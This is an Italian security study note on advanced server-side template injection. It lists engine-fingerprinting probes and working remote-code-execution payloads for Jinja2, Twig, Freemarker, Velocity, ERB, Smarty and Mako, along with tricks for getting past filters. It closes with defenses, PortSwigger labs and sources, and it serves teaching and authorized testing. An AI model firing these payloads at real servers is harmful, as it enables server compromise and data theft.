---
tipo: concetto
tag: [web, owasp, tool]
fase: 4
fonti: 4
aggiornato: 2026-06-26
stato: maturo
aliases: ["SSTI Avanzato e Sandbox Escape", "SSTI Avanzato", "Template Sandbox Escape"]
---

# SSTI Avanzato e Sandbox Escape

> [!warning] Uso etico
> I payload SSTI di questa pagina arrivano a **RCE**. Eseguirli **solo** su lab autorizzati o target in scope. Una RCE su un server di produzione terzo senza permesso è reato grave.

## In breve
La pagina base [[Server-Side Template Injection (SSTI)]] copre il rilevamento e i fondamenti. Qui andiamo al livello expert: come si passa dall'iniezione confermata alla **RCE reale**, navigando la gerarchia di oggetti del linguaggio per **evadere la sandbox** del template engine. Il cuore della tecnica è il **MRO climbing** (risalire la gerarchia delle classi) per raggiungere primitive pericolose anche quando i builtin sono filtrati.

## Identificare l'engine (oltre il polyglot)
Polyglot di detection: `${{<%[%'"}}%\`. Poi si discrimina con payload mirati:
```text
{{7*7}}      → 49   (Jinja2, Twig — sintassi {{ }})
{{7*'7'}}    → 7777777  (Jinja2/Python)  vs  49 (Twig/PHP)
${7*7}       → 49   (Freemarker, JSP EL, Velocity, Mako-ish)
<%= 7*7 %>   → 49   (ERB Ruby)
#{7*7}       → 49   (Thymeleaf, alcuni)
```

## Jinja2 / Python — sandbox escape via MRO
Il classico: da un oggetto qualsiasi si risale a `object`, si enumerano le sottoclassi e si trova una classe con una sink (`subprocess.Popen`, `os`, `warnings.catch_warnings`).
```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}            # lista delle sottoclassi di object
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX] }}     # individua Popen / catch_warnings
# RCE diretta via Popen (l'indice varia per versione):
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate() }}
# RCE robusta via builtins di un frame:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## Bypass di filtri Jinja2 (sandbox "sicura")
Quando `__class__`, `[`, `.` o keyword sono bloccati:
```jinja
{{ ''['__cl'+'ass__'] }}                     # concatenazione per eludere blacklist
{{ ''|attr('__class__') }}                   # filtro attr() invece del punto
{{ request['application']['__globals__'] }}  # accesso con subscript invece del punto
{{ request|attr('application')|attr('__globals__') }}
# bypass del filtro su "_": usare \x5f o request.args per costruire stringhe
{{ ()["__cla"+request.args.x] }}             # request.args.x = "ss__"
```

## Twig (PHP) — RCE
```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ ['id']|filter('system') }}
{{ ['id']|map('system')|join }}
```

## Freemarker (Java) — RCE
```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
${"freemarker.template.utility.Execute"?new()("id")}
```

## Velocity (Java) — RCE
```text
#set($e="exp")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

## ERB / Ruby — RCE
```erb
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").read %>
```

## Smarty (PHP) e Mako (Python)
```smarty
{system('id')}
{php}system('id');{/php}
```
```mako
${__import__('os').popen('id').read()}
<%! import os %>${os.popen('id').read()}
```

## Tooling
**tplmap** e **SSTImap** automatizzano detection, identificazione engine ed exploit/RCE. Per il fuzzing manuale si usa [[Burp Suite]] (Intruder con liste di payload per engine).

## Varianti e blind SSTI
- **Blind SSTI**: nessun output riflesso → esfiltra out-of-band (DNS/HTTP verso Collaborator) o time-based.
- **Engine "logic-less"** (Mustache, Handlebars puro): no espressioni → spesso non SSTI ma possibile [[Prototype Pollution]]/gadget per arrivarci.
- **Context**: iniezione in template *plaintext* vs *codice* — cambia il set di primitive disponibili.

## Impatto
**RCE** con i privilegi del processo web → compromissione del server, lettura file, pivot in rete interna ([[Server-Side Request Forgery (SSRF)]]). Tra le vulnerabilità web a impatto massimo.

## Come difendersi
1. **Non passare input utente come template**; usa template **statici** con i dati passati solo come *variabili/contesto*.
2. Usa una **sandbox reale** dell'engine (es. Jinja2 `SandboxedEnvironment`) consapevole che è bypassabile → difesa in profondità, non unica.
3. **Logic-less templates** (Mustache) dove possibile.
4. Esegui il rendering in **processi/container isolati** a privilegi minimi (limita il blast radius della RCE).
5. Input validation/escaping e WAF come strati aggiuntivi, mai come unica protezione.

## Lab
- PortSwigger — Server-side template injection (lab: "Basic SSTI", "Code context", "Using documentation", "Known vulnerabilities", "Engine without documentation", "Custom exploit" — copre escape avanzati ERB/Twig/Freemarker/Handlebars): https://portswigger.net/web-security/server-side-template-injection
- PortSwigger — Exploiting SSTI: https://portswigger.net/web-security/server-side-template-injection/exploiting
- HackTricks — SSTI (payload per ogni engine): https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- PayloadsAllTheThings — Server Side Template Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

## Collegamenti
- [[Server-Side Template Injection (SSTI)]]
- [[Prototype Pollution]]
- [[Insecure Deserialization Avanzata (gadget chains)]]
- [[Server-Side Request Forgery (SSRF)]]
- [[Burp Suite]]
- [[OWASP Top 10]]

## Fonti
- PortSwigger — Server-side template injection: https://portswigger.net/web-security/server-side-template-injection
- James Kettle — "Server-Side Template Injection: RCE for the modern webapp" (paper fondante): https://portswigger.net/research/server-side-template-injection
- HackTricks — SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- swisskyrepo/PayloadsAllTheThings — SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
